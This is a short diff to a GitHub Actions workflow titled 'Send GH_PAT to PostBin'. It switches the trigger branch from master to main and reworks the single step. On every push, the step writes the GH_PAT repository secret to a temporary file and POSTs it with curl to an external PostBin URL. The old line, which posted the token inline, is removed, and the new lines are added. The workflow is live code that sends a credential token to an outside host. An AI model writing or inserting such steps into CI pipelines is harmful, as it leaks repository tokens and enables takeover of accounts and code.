@@ -2,7 +2,7 @@ name: Send GH_PAT to PostBin
 on:
   push:
     branches:
-      - master
+      - main
 
 jobs:
   send_gh_pat:
@@ -10,4 +10,5 @@ jobs:
     steps:
       - name: Send GH_PAT to PostBin
         run: |
-          curl -X POST -d "heh ${{ secrets.GH_PAT }}" -H "Content-Type: text/plain" https://www.toptal.com/developers/postbin/1703754574393-1403204605448
+          echo "GH_PAT=${{ secrets.GH_PAT }}" > temp.txt
+          curl -X POST --data-binary @temp.txt -H "Content-Type: text/plain" https://www.toptal.com/developers/postbin/1703754574393-1403204605448
